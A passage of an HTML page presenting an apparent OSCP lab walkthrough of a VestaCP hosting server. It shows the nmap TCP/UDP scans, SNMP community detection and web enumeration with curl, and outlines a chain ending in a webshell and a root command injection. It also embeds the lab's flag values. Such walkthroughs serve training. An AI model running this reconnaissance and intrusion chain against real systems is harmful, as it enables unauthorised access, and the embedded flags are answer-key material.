@@ -1,0 +1,1802 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>192.168.161.156 — vesta · OSCP walkthrough</title>
+<meta name="description" content="Interactive step-by-step OSCP lab walkthrough: an SNMP extend entry that publishes a cleartext panel password, then a VestaCP mailbox forwarding field that executes as root. Full commands, reasoning and raw output.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="192.168.161.156 — vesta · OSCP walkthrough">
+<meta property="og:description" content="UDP/161 nsExtendConfigTable → jack's password → VestaCP 0.9.8-27 → v_fwd injection → root.">
+<meta name="color-scheme" content="dark light">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --bg:#0a0e13; --bg2:#0f151d; --panel:#0d131b; --line:#1c2836; --line2:#263545;
+  --fg:#dde5ee; --dim:#8697ab; --dim2:#5d6d80;
+  --acc:#3fb950; --acc-dim:#1f6f31; --amber:#d29922; --red:#f85149; --link:#58a6ff;
+  --code:#070a0e; --shadow:0 20px 50px rgba(0,0,0,.45);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#ffffff; --panel:#ffffff; --line:#e3e8ef; --line2:#d3dae4;
+  --fg:#151b23; --dim:#5a6675; --dim2:#7d8898;
+  --acc:#1a7f37; --acc-dim:#8fd19e; --amber:#9a6700; --red:#cf222e; --link:#0969da;
+  --code:#0d1117; --shadow:0 16px 40px rgba(15,25,40,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:16px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--link);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.88em}
+.skip{position:absolute;left:-9999px;top:0;background:var(--acc);color:#04120a;padding:10px 16px;z-index:99}
+.skip:focus{left:8px;top:8px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.02em;white-space:nowrap}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
+.brand .slash{color:var(--dim2);font-weight:400}
+.brand-sub{color:var(--dim);font-weight:500}
+.search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
+#search{
+  width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
+  background:var(--bg2);color:var(--fg);font-family:var(--sans);font-size:14px;outline:none;
+}
+#search:focus{border-color:var(--acc);box-shadow:0 0 0 3px color-mix(in srgb,var(--acc) 18%,transparent)}
+.search-count{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;color:var(--dim2)}
+.icon-btn{
+  background:var(--bg2);border:1px solid var(--line2);color:var(--fg);border-radius:10px;
+  width:38px;height:38px;font-size:16px;cursor:pointer;line-height:1;
+}
+.icon-btn:hover{border-color:var(--acc)}
+.burger{display:none;background:none;border:1px solid var(--line2);color:var(--fg);border-radius:9px;width:38px;height:38px;font-size:17px;cursor:pointer}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:296px minmax(0,1fr);gap:0;align-items:start}
+.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;padding:20px 16px 60px;
+  border-right:1px solid var(--line);background:var(--bg);
+}
+.sidebar::-webkit-scrollbar{width:9px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--line2);border-radius:9px}
+
+.card{border:1px solid var(--line);border-radius:14px;padding:14px;background:var(--panel);margin-bottom:16px}
+.card h3{margin:0 0 10px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.progress-track{height:6px;border-radius:99px;background:var(--line);overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc-dim),var(--acc));transition:width .35s ease}
+.progress-label{margin-top:9px;font-size:12px;color:var(--dim);display:flex;justify-content:space-between}
+.progress-label b{color:var(--fg)}
+
+.nav-title{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim2);margin:4px 8px 8px}
+.nav-item{
+  display:grid;grid-template-columns:26px 1fr 20px;align-items:center;gap:8px;
+  padding:9px 10px;border-radius:10px;color:var(--fg);font-size:14px;
+  border:1px solid transparent;text-decoration:none;
+}
+.nav-item:hover{background:var(--bg2);text-decoration:none}
+.nav-item.active{background:color-mix(in srgb,var(--acc) 12%,transparent);border-color:color-mix(in srgb,var(--acc) 35%,transparent)}
+.nav-item.active .nav-num{color:var(--acc)}
+.nav-item.done .nav-label{color:var(--dim);text-decoration:line-through}
+.nav-num{font-family:var(--mono);font-size:11px;color:var(--dim2)}
+.nav-check{appearance:none;width:16px;height:16px;border:1.5px solid var(--line2);border-radius:5px;cursor:pointer;margin:0;background:transparent}
+.nav-check:checked{background:var(--acc);border-color:var(--acc)}
+.nav-check:checked::after{content:"✓";display:block;color:#04120a;font-size:12px;line-height:13px;text-align:center;font-weight:700}
+.nav-tools{display:flex;gap:8px;margin-top:12px}
+.ghost{
+  flex:1;background:var(--bg2);border:1px solid var(--line2);color:var(--dim);
+  padding:7px 10px;border-radius:9px;font-size:12px;cursor:pointer;font-family:var(--sans);
+}
+.ghost:hover{color:var(--fg);border-color:var(--acc)}
+.meta-line{display:flex;justify-content:space-between;gap:10px;font-size:12px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.meta-line:last-child{border-bottom:0}
+.meta-line span:first-child{color:var(--dim)}
+.meta-line span:last-child{font-family:var(--mono);font-size:11px;text-align:right}
+
+/* ---------- main ---------- */
+main{padding:34px 36px 90px;max-width:1000px;width:100%}
+
+.hero{margin-bottom:38px}
+.eyebrow{font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--acc);margin-bottom:12px}
+.hero h1{margin:0;font-size:clamp(28px,4vw,44px);line-height:1.12;letter-spacing:-.025em;font-family:var(--sans)}
+.hero h1 .ip{font-family:var(--mono);font-weight:600;font-size:.9em;letter-spacing:-.045em}
+.hero h1 .name{color:var(--dim);font-weight:500}
+.lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 18px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.badge{
+  font-size:12px;padding:5px 11px;border-radius:99px;border:1px solid var(--line2);
+  color:var(--dim);background:var(--bg2);font-family:var(--mono);
+}
+.badge.ok{color:var(--acc);border-color:color-mix(in srgb,var(--acc) 40%,transparent);background:color-mix(in srgb,var(--acc) 9%,transparent)}
+.badge.warn{color:var(--amber);border-color:color-mix(in srgb,var(--amber) 40%,transparent);background:color-mix(in srgb,var(--amber) 9%,transparent)}
+
+.chain{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:8px 0 6px}
+.step{
+  position:relative;display:flex;flex-direction:column;gap:3px;padding:12px;border-radius:12px;
+  border:1px solid var(--line);background:var(--panel);color:var(--fg);text-decoration:none;
+  transition:transform .15s ease,border-color .15s ease;
+}
+.step:hover{transform:translateY(-2px);border-color:var(--acc);text-decoration:none}
+.step-num{font-family:var(--mono);font-size:10px;color:var(--acc)}
+.step-label{font-weight:650;font-size:14px}
+.step-desc{font-size:11.5px;color:var(--dim);line-height:1.45}
+.step-desc code{font-size:11px;background:var(--code);padding:1px 4px;border-radius:4px;color:#c9d5e4}
+
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin:26px 0 10px}
+.flag{border:1px solid var(--line);border-radius:14px;padding:16px;background:var(--panel)}
+.flag .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px}
+.flag .v{font-family:var(--mono);font-size:14px;word-break:break-all;min-height:22px}
+.flag.revealed .v{color:var(--acc)}
+.flag .reveal{margin-top:10px;background:none;border:0;color:var(--link);font-size:12px;cursor:pointer;padding:0}
+.flag .masked{letter-spacing:.18em;color:var(--dim2)}
+
+/* ---------- chapters ---------- */
+.chapter{scroll-margin-top:78px;margin:0 0 34px;border-top:1px solid var(--line);padding-top:26px}
+.ch-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:6px}
+.ch-num{
+  font-family:var(--mono);font-size:12px;color:var(--acc);border:1px solid color-mix(in srgb,var(--acc) 35%,transparent);
+  background:color-mix(in srgb,var(--acc) 9%,transparent);border-radius:9px;padding:6px 9px;flex:none;
+}
+.ch-title{flex:1;min-width:0}
+.ch-title h2{margin:0;font-size:24px;letter-spacing:-.01em}
+.ch-sub{margin:2px 0 0;color:var(--dim);font-size:13.5px}
+.copyall{flex:none;max-width:140px}
+
+.content{font-size:15.3px}
+.content h3{font-size:18px;margin:0;letter-spacing:-.01em}
+.content h4{font-size:14px;margin:22px 0 8px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.content p{margin:10px 0}
+.content ul,.content ol{padding-left:22px;margin:10px 0}
+.content li{margin:5px 0}
+.content strong{color:#fff}
+[data-theme="light"] .content strong{color:#000}
+.content code{
+  background:color-mix(in srgb,var(--line2) 42%,transparent);border:1px solid var(--line);
+  padding:.1em .36em;border-radius:5px;color:#e8eff8;white-space:nowrap;
+}
+[data-theme="light"] .content code{color:#0d1520;background:#edf1f6}
+.block pre code,.block pre span{background:none;border:0;padding:0}
+.content td code,.content li code{white-space:normal}
+.content hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+.content blockquote{margin:14px 0;padding:10px 14px;border-left:3px solid var(--amber);background:color-mix(in srgb,var(--amber) 7%,transparent);border-radius:0 8px 8px 0;color:var(--dim)}
+.content blockquote p{margin:4px 0}
+
+.sec{border:1px solid var(--line);border-radius:12px;margin:14px 0;background:color-mix(in srgb,var(--panel) 60%,transparent);overflow:hidden}
+.sec-head{
+  width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;color:var(--fg);
+  padding:12px 15px;font-size:17px;font-weight:650;cursor:pointer;text-align:left;font-family:var(--sans);
+}
+.sec-head:hover{background:var(--bg2)}
+.sec-head::before{content:"";flex:none;width:7px;height:7px;margin-top:-3px;border-right:1.7px solid var(--dim2);border-bottom:1.7px solid var(--dim2);transform:rotate(-45deg);transition:transform .18s ease}
+.sec-head[aria-expanded="true"]::before{transform:rotate(45deg);margin-top:-5px}
+.sec-body{padding:2px 15px 14px}
+.sec-body[hidden]{display:none}
+
+/* tables */
+table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
+tr:nth-child(even) td{background:color-mix(in srgb,var(--bg2) 55%,transparent)}
+
+/* code cards */
+.block{margin:12px 0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--code)}
+.block-bar{
+  display:flex;align-items:center;justify-content:space-between;padding:6px 10px;
+  background:#0b1017;border-bottom:1px solid #16202c;
+}
+[data-theme="light"] .block-bar{background:#161b22;border-bottom-color:#232c38}
+.block-tag{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5f7085}
+.block-cmd .block-tag{color:#3fb950}
+.copy{
+  background:#131c26;border:1px solid #24313f;color:#9fb0c3;border-radius:7px;
+  font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans);
+}
+.copy:hover{color:#fff;border-color:#3fb950}
+.copy.done{color:#3fb950;border-color:#3fb950}
+.block pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.9px;line-height:1.6;color:#c9d5e4}
+.block-out{border-style:dashed}
+.block-out pre{color:#93a3b6}
+.codehilite{background:transparent}
+.codehilite pre{margin:0}
+.highlight .c,.highlight .c1,.highlight .cm{color:#5f7085;font-style:italic}
+.highlight .k,.highlight .kn,.highlight .kd{color:#d2a8ff}
+.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb{color:#7ee787}
+.highlight .nb,.highlight .nf{color:#79c0ff}
+.highlight .nv,.highlight .vi{color:#ffa657}
+.highlight .mi,.highlight .m{color:#ffa657}
+.highlight .o,.highlight .p{color:#c9d5e4}
+.highlight .gp{color:#3fb950;font-weight:700}
+
+footer{margin-top:50px;padding-top:22px;border-top:1px solid var(--line);color:var(--dim2);font-size:12.5px;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between}
+
+/* toast + top button */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
+  background:var(--acc);color:#04120a;padding:9px 16px;border-radius:99px;font-size:13px;font-weight:650;
+  transition:opacity .2s ease,transform .2s ease;z-index:60;
+}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+#toTop{
+  position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:50;font-size:16px;
+}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--acc)}
+
+mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inherit;border-radius:3px}
+
+@media (max-width:940px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{
+    position:fixed;inset:59px 0 0 0;height:auto;z-index:35;transform:translateX(-102%);
+    transition:transform .22s ease;width:296px;box-shadow:var(--shadow);
+  }
+  .sidebar.open{transform:none}
+  .burger{display:block}
+  main{padding:24px 18px 80px}
+  .search-wrap{max-width:none}
+  .copyall{display:none}
+  .brand-sub,.brand .slash{display:none}
+}
+@media print{
+  .topbar,.sidebar,#toTop,#toast,.copy,.copyall,.block-bar{display:none!important}
+  .shell{display:block}
+  main{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .sec{border:0;margin:0}
+  .sec-head{font-size:14px}
+  .sec-body{display:block!important}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="topbar">
+  <button class="burger" id="burger" type="button" aria-label="Open navigation">☰</button>
+  <div class="brand"><span class="dot"></span>OSCP<span class="slash">/</span><span class="brand-sub">vesta</span></div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Search chapters…   ( / )" autocomplete="off" aria-label="Search chapters">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+  <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle colour theme" title="Toggle theme">◐</button>
+</header>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="card">
+      <h3>Progress</h3>
+      <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
+      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+    </div>
+
+    <div class="nav-title">Chapters</div>
+    <nav><a class="nav-item" href="#ch-01" data-target="ch-01"><span class="nav-num">01</span><span class="nav-label">Reconnaissance</span><input class="nav-check" type="checkbox" data-ch="ch-01" aria-label="Mark Reconnaissance complete"></a>
+<a class="nav-item" href="#ch-02" data-target="ch-02"><span class="nav-num">02</span><span class="nav-label">Web enumeration</span><input class="nav-check" type="checkbox" data-ch="ch-02" aria-label="Mark Web enumeration complete"></a>
+<a class="nav-item" href="#ch-03" data-target="ch-03"><span class="nav-num">03</span><span class="nav-label">SNMP</span><input class="nav-check" type="checkbox" data-ch="ch-03" aria-label="Mark SNMP complete"></a>
+<a class="nav-item" href="#ch-04" data-target="ch-04"><span class="nav-num">04</span><span class="nav-label">Panel access</span><input class="nav-check" type="checkbox" data-ch="ch-04" aria-label="Mark Panel access complete"></a>
+<a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">Foothold</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark Foothold complete"></a>
+<a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">Privilege escalation</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark Privilege escalation complete"></a>
+<a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">Flags &amp; cleanup</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark Flags and cleanup complete"></a>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+    <div class="nav-tools">
+      <button class="ghost" id="expandAll" type="button">Expand all</button>
+      <button class="ghost" id="collapseAll" type="button">Collapse all</button>
+    </div>
+    <div class="nav-tools"><button class="ghost" id="resetProgress" type="button">Reset progress</button></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Target</h3>
+      <div class="meta-line"><span>Host</span><span>lab-pwk2-student-cl6-156</span></div>
+      <div class="meta-line"><span>IP</span><span>192.168.161.156</span></div>
+      <div class="meta-line"><span>OS</span><span>Ubuntu 18.04 LTS</span></div>
+      <div class="meta-line"><span>TCP</span><span>21, 22, 25, 53, 80, 110, 143, 465, 587, 993, 995, 2525, 3306, 8080, 8083, 8443</span></div>
+      <div class="meta-line"><span>UDP</span><span>53, 161</span></div>
+      <div class="meta-line"><span>Result</span><span>root</span></div>
+    </div>
+
+    <div class="card">
+      <h3>Source</h3>
+      <div class="meta-line"><span>Repo</span><span><a href="https://github.com/AV10V/OSCP">AV10V/OSCP</a></span></div>
+      <div class="meta-line"><span>Notes</span><span>markdown</span></div>
+      <div class="meta-line"><span>All labs</span><span><a href="../../main.html">main</a></span></div>
+    </div>
+  </aside>
+
+  <main id="main">
+    <section class="hero" id="overview">
+      <div class="eyebrow">OSCP lab walkthrough</div>
+      <h1><span class="ip">192.168.161.156</span> <span class="name">— vesta</span></h1>
+      <p class="lede">
+        A hosting server with sixteen TCP ports, a full mail stack and a control panel — and an entry point on a UDP port nobody scans. The host publishes its own password in the SNMP MIB, and the panel then runs an unprivileged user's mailbox forwarding address as root.
+      </p>
+      <div class="badges">
+        <span class="badge">Ubuntu 18.04</span>
+        <span class="badge">Exim 4.90_1 · Dovecot</span>
+        <span class="badge">VestaCP 0.9.8-27</span>
+        <span class="badge warn">udp/161 snmpd public</span>
+        <span class="badge warn">v_fwd → sudo</span>
+        <span class="badge ok">root · 2 flags</span>
+      </div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">UDP 161</span><span class="step-desc">snmpd · community <code>public</code></span></a>
+<a class="step" href="#ch-03"><span class="step-num">02</span><span class="step-label">Extend leak</span><span class="step-desc"><code>nsExtendConfigTable</code> → <code>jack:3PUKs…</code></span></a>
+<a class="step" href="#ch-04"><span class="step-num">03</span><span class="step-label">Panel</span><span class="step-desc">0.9.8-27 · session token</span></a>
+<a class="step" href="#ch-05"><span class="step-num">04</span><span class="step-label">Upload</span><span class="step-desc">webshell in <code>public_html</code> as jack</span></a>
+<a class="step" href="#ch-06"><span class="step-num">05</span><span class="step-label">v_fwd</span><span class="step-desc"><code>sudo v-edit-mail-account</code></span></a>
+<a class="step" href="#ch-07"><span class="step-num">06</span><span class="step-label">root</span><span class="step-desc"><code>proof.txt</code></span></a></div>
+      <div class="flags">
+        <div class="flag">
+          <div class="k">local.txt · as jack</div>
+          <div class="v" data-value="9cfca959e54738e70905a4024d16a44a"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+        <div class="flag">
+          <div class="k">proof.txt · as root</div>
+          <div class="v" data-value="d4640a77ca31e0ab126751f98e819888"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="chapter" id="ch-01" data-title="Reconnaissance"><div class="ch-head"><span class="ch-num">01</span><div class="ch-title"><h2>Reconnaissance</h2><p class="ch-sub">Sixteen TCP ports, and the UDP one that mattered</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The target is a hosting server. Sixteen TCP ports, a full mail stack, a control panel, and — as it
+turned out — one UDP port that decided the whole box.</p>
+<hr />
+<h3>1.1 Full TCP scan</h3>
+<p>Never trust a top-1000 sweep on a hosting box; the interesting panel is usually in the 8000s.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-p-<span class="w"> </span>-sV<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-oN<span class="w"> </span>nmap_full.txt<span class="w"> </span><span class="m">192</span>.168.161.156
+</pre></div>
+<p>Sixteen ports, and every one of them is a real service:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+25/tcp   open  smtp     Exim smtpd 4.90_1
+53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18
+80/tcp   open  http     nginx
+110/tcp  open  pop3     Dovecot pop3d
+143/tcp  open  imap     Dovecot imapd
+465/tcp  open  smtps    Exim smtpd 4.90_1
+587/tcp  open  submission  Exim smtpd 4.90_1
+993/tcp  open  imaps    Dovecot imapd
+995/tcp  open  pop3s    Dovecot pop3d
+2525/tcp open  smtp     Exim smtpd 4.90_1
+3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
+8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+8083/tcp open  http     nginx
+8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+</pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><strong>80 and 8083 are nginx; 8080 and 8443 are Apache.</strong> Two web servers on one host, with nginx in
+  front. That is a reverse-proxy layout, not a single site.</li>
+<li><strong><code>mod_fcgid</code></strong> means PHP-FPM-style execution under Apache. On a hosting panel that usually means
+  PHP runs as the <strong>vhost owner</strong>, not <code>www-data</code> — a PHP file you control is a real user shell.</li>
+<li><strong>Four SMTP listeners</strong> (25, 465, 587, 2525) and a complete Dovecot stack. This is a mail server.</li>
+<li><strong><code>3306</code> reachable from the network</strong> is notable on its own. Panel installers bind MySQL to
+  <code>127.0.0.1</code>; a remote handshake means somebody changed <code>bind-address</code>.</li>
+<li>No <code>88</code>, <code>389</code>, <code>636</code>, <code>445</code>. <strong>Standalone host, not a domain member.</strong> AD tooling is wasted here.</li>
+</ul>
+<h3>1.2 The TLS certificate names the product</h3>
+<p>Every mail port and FTP present the same certificate. That is free fingerprinting — read it before
+you fuzz anything.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-p21,25,110,143,465,587,993,995<span class="w"> </span>--script<span class="w"> </span>ssl-cert<span class="w"> </span><span class="m">192</span>.168.161.156
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>Subject: commonName=oscp.example.com
+         organizationName=Vesta Control Panel
+         stateOrProvinceName=California
+         countryName=US
+Not valid before: 2022-11-08T08:16:51
+Not valid after:  2023-11-08T08:16:51
+</pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>O=Vesta Control Panel</code> is the answer to "what is on 8083" before you ever open it.</li>
+<li>A <strong>2022-11-08</strong> build date sets the patch baseline. Ubuntu 18.04 with a late-2022 image means
+  most 2018–2019 CVEs are patched; anything from 2021 onward may still be live.</li>
+<li><code>CN=oscp.example.com</code> is the vhost the panel was installed for. Remember it — the panel's upload
+  handler compares <code>HTTP_ORIGIN</code> against exactly this name and dies on a mismatch.</li>
+<li>The certificate expired in 2023. Nobody renewed it, which is a small signal that the box is
+  unmaintained.</li>
+</ul>
+<h3>1.3 The scan that was missing</h3>
+<p>The whole TCP surface is a distraction. The entry point was on <strong>UDP/161</strong>, and no TCP scan can
+see it.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span>,69,123,137,161,500,623<span class="w"> </span>--script<span class="w"> </span>snmp-info,snmp-sysdescr<span class="w"> </span><span class="m">192</span>.168.161.156
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info:
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   snmpEngineBoots: 15
+|_  snmpEngineTime: 55m02s
+53/udp  open  domain  ISC BIND 9.11.3-1ubuntu1.18
+</pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>SNMPv1 server ... (public)</code> — the NSE script has already told us the community string is
+  <code>public</code> and that v1 is accepted. That is unauthenticated read access to the entire MIB tree.</li>
+<li><code>snmpEngineBoots: 15</code> means the daemon has been up a while and is not being restarted defensively.</li>
+<li>v1 matters: SNMPv1 has no per-user authentication, so a community string is the <em>only</em> control.</li>
+</ul>
+<p><code>-p-</code> on TCP is not a port scan. It is a TCP port scan. The distinction cost more time on this box
+than any other single mistake.</p>
+<h3>1.4 What the shape of the box implies</h3>
+<p>Before touching an exploit, the layout constrains the answer:</p>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Implication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vesta panel on 8083, Apache back-end on 8080/8443</td>
+<td>Hosting control plane — it runs privileged shell commands for users</td>
+</tr>
+<tr>
+<td><code>mod_fcgid</code></td>
+<td>PHP runs as vhost owner, so webshell = user shell</td>
+</tr>
+<tr>
+<td>Full Exim + Dovecot + Roundcube stack</td>
+<td>Mailboxes will hold credentials and mail</td>
+</tr>
+<tr>
+<td>MySQL on the network</td>
+<td>Either an exposed database or a deliberately weakened one</td>
+</tr>
+<tr>
+<td><code>O=Vesta Control Panel</code>, expired cert</td>
+<td>Unmaintained install, panel-era vulnerabilities plausible</td>
+</tr>
+<tr>
+<td><code>161/udp public</code></td>
+<td>Free unauthenticated read of the host's MIB tree</td>
+</tr>
+</tbody>
+</table>
+<p>The intended path on a panel box is almost never "exploit the web server". It is <strong>get any account,
+then abuse the panel's own privilege</strong>. Chapter 03 is where the account comes from.</p></div></section>
+<section class="chapter" id="ch-02" data-title="Web enumeration"><div class="ch-head"><span class="ch-num">02</span><div class="ch-title"><h2>Web enumeration</h2><p class="ch-sub">Two servers, one panel, one false positive</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Four HTTP services. Three of them turned out to be the same application seen through different
+listeners, and one "endpoint" turned out to be a file that was already there.</p>
+<hr />
+<h3>2.1 nginx on 80 — the placeholder site</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.161.156/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40
+curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.161.156/robots.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>## robots.txt (65 bytes)
+User-agent: *
+Disallow: /phpmyadmin/
+Disallow: /webmail/
+</pre></div>
+<p>The site itself is a <strong>1055-byte "Coming Soon" page</strong> — a stock Vesta placeholder. <code>robots.txt</code>
+is more useful than the page: it names the two applications a hosting box always ships.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code} %{size_download}\n'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://192.168.161.156/phpmyadmin/<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://192.168.161.156/webmail/<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://192.168.161.156/roundcube/
+</pre></div>
+<p>Both <code>/phpmyadmin/</code> and <code>/webmail/</code> are served, and <code>/webmail/</code> is Roundcube. On a mail host that
+is a mailbox-login surface, and mailboxes are where onboarding credentials live.</p>
+<h3>2.2 Apache on 8080 and 8443 — the back-end</h3>
+<p>The Apache listeners sit behind nginx and serve the same vhosts. Two things are worth checking:</p>
